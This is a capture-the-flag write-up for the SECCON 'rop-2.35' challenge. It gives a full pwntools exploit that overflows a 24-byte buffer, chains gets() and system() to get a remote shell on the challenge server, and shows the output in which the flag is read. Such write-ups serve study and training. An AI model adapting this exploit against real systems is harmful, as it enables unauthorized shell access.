![image](https://github.com/KernelKrise/CTF/assets/76210733/33c3ac23-d081-46f2-a94a-b1a932360dfe)
```
In [3]: cyclic_find(0x61616167)
Out[3]: 24
```

buffer length → 24 bytes
Just buffer overflow  → call gets() to read user input to writable address (in $rdi register on ret instruction), then call system() with payload writen by gets()

solve.py:
```
#!/usr/bin/env python3
from pwn import *


elf = ELF('/home/kali/Desktop/seccon/rop-2.35/chall')
rop = ROP(elf)
context.arch = elf.arch

# p = process('/home/kali/Desktop/seccon/rop-2.35/chall')
# gdb.attach(p, gdbscript='b *main+46')
p = remote('rop-2-35.seccon.games', 9999)

payload = cyclic(24)
payload += p64(elf.plt['gets'])
payload += p64(elf.plt['system'])

print(p.recv().decode(errors='ignore'))
p.sendline(payload)

p.sendline(b'/bin0sh')

p.interactive()
```

OUTPUT:
```
$ ./solve.py
[*] '/home/kali/Desktop/seccon/rop-2.35/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 5 cached gadgets for '/home/kali/Desktop/seccon/rop-2.35/chall'
[+] Opening connection to rop-2-35.seccon.games on port 9999: Done
Enter something:

[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag-b6c1520bf7debd2531dec4a0a58e878c.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag-b6c1520bf7debd2531dec4a0a58e878c.txt
SECCON{i_miss_you_libc_csu_init_:cry:}
```
